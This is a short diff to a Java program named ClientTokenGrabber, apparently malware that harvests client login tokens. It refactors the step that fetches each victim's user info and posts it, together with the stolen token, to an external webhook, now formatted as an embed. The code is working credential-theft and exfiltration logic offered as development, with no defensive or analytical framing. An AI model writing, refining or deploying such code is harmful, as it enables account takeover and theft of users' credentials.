@@ -4,10 +4,8 @@ import java.nio.file.Paths;
 import java.util.Set;
 import java.util.HashSet;
 
-import main.java.clienttokengrabber.utils.Decryptor;
-import main.java.clienttokengrabber.utils.FileManager;
-import main.java.clienttokengrabber.utils.Json;
-import main.java.clienttokengrabber.utils.Requests;
+
+import main.java.clienttokengrabber.utils.*;
 
 public class ClientTokenGrabber {
     private static Set<String> tokens = new HashSet<>();
@@ -21,11 +19,7 @@ public class ClientTokenGrabber {
 
             String userInfo = Requests.get(token, USER_INFO_URL);
             if (userInfo != null) {
-                Json userInfoJson = new Json(userInfo);
-                String username = userInfoJson.valueOf("username");
-                String id = userInfoJson.valueOf("id");
-                String jsonPayload = "{\"content\":\"```" + username + " " + id + " " + token + "```\"}";
-                Requests.post(jsonPayload, WEBHOOK_URL);
+                Requests.post(EmbedGenerator.generateEmbed(userInfo, token), WEBHOOK_URL);
                 System.out.println("User Info: " + userInfo);
             }
         }
